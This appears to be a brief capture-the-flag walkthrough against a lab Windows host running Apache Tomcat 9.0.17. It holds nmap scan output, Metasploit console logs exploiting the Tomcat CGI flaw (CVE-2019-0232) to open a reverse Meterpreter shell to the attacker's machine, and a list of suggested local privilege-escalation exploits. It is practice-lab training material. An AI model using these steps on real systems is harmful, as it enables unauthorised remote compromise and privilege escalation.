- port scanning
```
[+] Port scanning...
3389/tcp open  ms-wbt-server
8009/tcp open  ajp13
8080/tcp open  http-proxy
[+] Enumerating open ports...

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS


PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat 9.0.17
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.17


PORT     STATE SERVICE        VERSION
3389/tcp open  ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: TBFC-WEB-01
|   NetBIOS_Domain_Name: TBFC-WEB-01
|   NetBIOS_Computer_Name: TBFC-WEB-01
|   DNS_Domain_Name: tbfc-web-01
|   DNS_Computer_Name: tbfc-web-01
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-12T18:34:26+00:00
| ssl-cert: Subject: commonName=tbfc-web-01
| Not valid before: 2020-11-27T01:29:04
|_Not valid after:  2021-05-29T01:29:04
|_ssl-date: 2020-12-12T18:34:27+00:00; +1s from scanner time.
```
- cve https://www.trendmicro.com/en_us/research/19/d/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat.html
- http://<ip>:8080/cgi-bin/elfwhacker.bat
```console
msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) > set targeturi /cgi-bin/elfwhacker.bat
targeturi => /cgi-bin/elfwhacker.bat
msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) > run

[*] Started reverse TCP handler on 10.8.14.151:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Command Stager progress -   6.95% done (6999/100668 bytes)
[*] Command Stager progress -  13.91% done (13998/100668 bytes)
[*] Command Stager progress -  20.86% done (20997/100668 bytes)
[*] Command Stager progress -  27.81% done (27996/100668 bytes)
[*] Command Stager progress -  34.76% done (34995/100668 bytes)
[*] Command Stager progress -  41.72% done (41994/100668 bytes)
[*] Command Stager progress -  48.67% done (48993/100668 bytes)
[*] Command Stager progress -  55.62% done (55992/100668 bytes)
[*] Command Stager progress -  62.57% done (62991/100668 bytes)
[*] Command Stager progress -  69.53% done (69990/100668 bytes)
[*] Command Stager progress -  76.48% done (76989/100668 bytes)
[*] Command Stager progress -  83.43% done (83988/100668 bytes)
[*] Command Stager progress -  90.38% done (90987/100668 bytes)
[*] Command Stager progress -  97.34% done (97986/100668 bytes)
[*] Sending stage (176195 bytes) to 10.10.35.81
[*] Command Stager progress - 100.02% done (100692/100668 bytes)
[*] Meterpreter session 1 opened (10.8.14.151:4444 -> 10.10.35.81:49827) at 2020-12-12 13:47:58 -0500
```
grab flag
```
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > set showdescription true
showdescription => true
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.35.81 - Collecting local exploits for x86/windows...
[*] 10.10.35.81 - 34 exploit checks are being tried...
[+] 10.10.35.81 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
  This module exploits CVE-2020-0787, an arbitrary file move 
  vulnerability in outdated versions of the Background Intelligent 
  Transfer Service (BITS), to overwrite 
  C:\Windows\System32\WindowsCoreDeviceInfo.dll with a malicious DLL 
  containing the attacker's payload. To achieve code execution as the 
  SYSTEM user, the Update Session Orchestrator service is then 
  started, which will result in the malicious 
  WindowsCoreDeviceInfo.dll being run with SYSTEM privileges due to a 
  DLL hijacking issue within the Update Session Orchestrator Service. 
  Note that presently this module only works on Windows 10 and Windows 
  Server 2016 and later as the Update Session Orchestrator Service was 
  only introduced in Windows 10. Note that only Windows 10 has been 
  tested, so your mileage may vary on Windows Server 2016 and later.
[+] 10.10.35.81 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
  This module exploits a missing DLL loaded by the 'IKE and AuthIP 
  Keyring Modules' (IKEEXT) service which runs as SYSTEM, and starts 
  automatically in default installations of Vista-Win8. It requires an 
  insecure bin path to plant the DLL payload.
[+] 10.10.35.81 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
  Module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. Currently the 
  module does not spawn as SYSTEM, however once achieving a shell, one 
  can easily use incognito to impersonate the token.
[*] Post module execution completed
```